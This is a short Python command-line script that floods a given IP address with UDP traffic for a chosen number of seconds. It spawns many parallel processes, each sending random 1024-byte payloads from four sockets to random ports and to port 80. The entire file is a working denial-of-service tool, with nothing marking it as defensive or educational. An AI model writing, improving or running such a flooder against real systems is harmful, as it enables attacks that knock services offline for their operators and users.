import multiprocessing
import time
import socket
import random
import sys

def usage():
    print("usage: " + sys.argv[0] + " <ip> <duration>")

def connsofdeath(ip):
    timeout = time.time() + 4
    bytesU = random._urandom(1024)

    conn1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    conn2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    conn3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    conn4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    r1 = random.randint(1, 1024)
    r2 = random.randint(1, 1024)
    r3 = random.randint(1, 1024)

    while time.time() < timeout:
        conn1.sendto(bytesU, (ip, r1))
        conn2.sendto(bytesU, (ip, r2))
        conn3.sendto(bytesU, (ip, r3))
        conn4.sendto(bytesU, (ip, 80))


def flood(ip, duration):
    timer = time.time()+duration
    cpuCount = multiprocessing.cpu_count()
    
    while time.time() < timer:
        with multiprocessing.Pool(cpuCount) as p:
            p.map(connsofdeath, [ip]*(cpuCount*8*8))
    
    print('ran for a duration of '+str(duration)+' seconds.')

def main():
    if len(sys.argv) != 3:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]))

if __name__ == '__main__':
    main()

